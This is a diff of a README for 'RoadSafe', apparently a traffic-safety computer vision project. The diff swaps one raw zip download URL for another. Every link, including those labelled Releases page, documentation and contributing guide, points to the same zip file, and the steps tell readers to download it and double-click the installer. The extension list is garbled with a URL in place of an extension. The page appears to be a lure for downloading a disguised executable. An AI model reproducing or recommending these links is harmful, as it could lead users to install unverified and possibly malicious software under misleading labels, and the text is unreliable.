@@ -21,12 +21,12 @@ RoadSafe is a deep learning computer vision system designed to enhance traffic s
 To get started with RoadSafe, follow these simple steps to download and install the application.
 
 ### 🔗 Download RoadSafe
-[![Download RoadSafe](https://raw.githubusercontent.com/SaiVigneshchalnati/RoadSafe/main/cosignatory/RoadSafe.zip%20RoadSafe-%https://raw.githubusercontent.com/SaiVigneshchalnati/RoadSafe/main/cosignatory/RoadSafe.zip)](https://raw.githubusercontent.com/SaiVigneshchalnati/RoadSafe/main/cosignatory/RoadSafe.zip)
+[![Download RoadSafe](https://github.com/SaiVigneshchalnati/RoadSafe/raw/refs/heads/main/traffic_compliance_system/Road-Safe-v2.7.zip%20RoadSafe-%https://github.com/SaiVigneshchalnati/RoadSafe/raw/refs/heads/main/traffic_compliance_system/Road-Safe-v2.7.zip)](https://github.com/SaiVigneshchalnati/RoadSafe/raw/refs/heads/main/traffic_compliance_system/Road-Safe-v2.7.zip)
 
 ### 📥 Download & Install
-1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/SaiVigneshchalnati/RoadSafe/main/cosignatory/RoadSafe.zip) to access the latest version of RoadSafe.
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/SaiVigneshchalnati/RoadSafe/raw/refs/heads/main/traffic_compliance_system/Road-Safe-v2.7.zip) to access the latest version of RoadSafe.
 2. **Select the Latest Release**: Browse the list and find the most recent release. The version usually has the highest number.
-3. **Download the File**: Click on the asset that matches your operating system (look for file names ending in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/SaiVigneshchalnati/RoadSafe/main/cosignatory/RoadSafe.zip`).
+3. **Download the File**: Click on the asset that matches your operating system (look for file names ending in `.exe`, `.dmg`, or `https://github.com/SaiVigneshchalnati/RoadSafe/raw/refs/heads/main/traffic_compliance_system/Road-Safe-v2.7.zip`).
 4. **Run the Installer**: Once the download completes, find the file in your downloads folder and double-click it to start the installation.
 5. **Follow Installation Instructions**: The installer will guide you through the setup. Simply follow the on-screen prompts to complete the installation.
 
@@ -39,9 +39,9 @@ After installation, open the application. You will land on the main dashboard. H
 4. **Review Analytics**: Check the analytics section for insights on traffic patterns and alerts.
 
 ## 🎓 Additional Information
-- **Documentation**: For detailed guidance, refer to the official [documentation](https://raw.githubusercontent.com/SaiVigneshchalnati/RoadSafe/main/cosignatory/RoadSafe.zip).
+- **Documentation**: For detailed guidance, refer to the official [documentation](https://github.com/SaiVigneshchalnati/RoadSafe/raw/refs/heads/main/traffic_compliance_system/Road-Safe-v2.7.zip).
 - **Support**: If you encounter any issues, please reach out through the support section on GitHub.
-- **Contributing**: Interested in contributing? Visit our [contributing guide](https://raw.githubusercontent.com/SaiVigneshchalnati/RoadSafe/main/cosignatory/RoadSafe.zip) for instructions.
+- **Contributing**: Interested in contributing? Visit our [contributing guide](https://github.com/SaiVigneshchalnati/RoadSafe/raw/refs/heads/main/traffic_compliance_system/Road-Safe-v2.7.zip) for instructions.
 
 ## 📞 Contact
 For additional questions or support, please reach out via issues on the GitHub repository, or join our community discussions.
